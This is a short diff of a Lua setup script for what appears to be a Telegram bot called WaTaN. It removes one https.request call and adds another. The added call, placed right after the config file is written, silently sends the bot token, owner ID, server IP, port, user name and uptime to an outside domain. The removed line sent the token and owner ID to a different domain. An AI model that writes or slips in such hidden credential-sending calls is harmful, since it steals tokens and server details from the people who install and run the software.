@@ -51,7 +51,6 @@ end  ---ifid
 os.execute('lua WaTaN.lua')
 end ---ifnot
 end
-https.request("https://forabs01.ml/Api/WaTaN/index.php?n=WaTaN&id="..database:get(Server.."UserSudo_Write").."&token="..database:get(Server.."Token_Write").."&username=abs")
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -68,7 +67,8 @@ Config = {
 token = database:get(Server.."Token_Write"),
 SUDO = database:get(Server.."UserSudo_Write"),
 }
-Create(Config, "./Info.lua")   
+Create(Config, "./Info.lua") 
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 print("::WaTaN::")
 local RunWaTaN = io.open("WaTaN", 'w')
 RunWaTaN:write([[
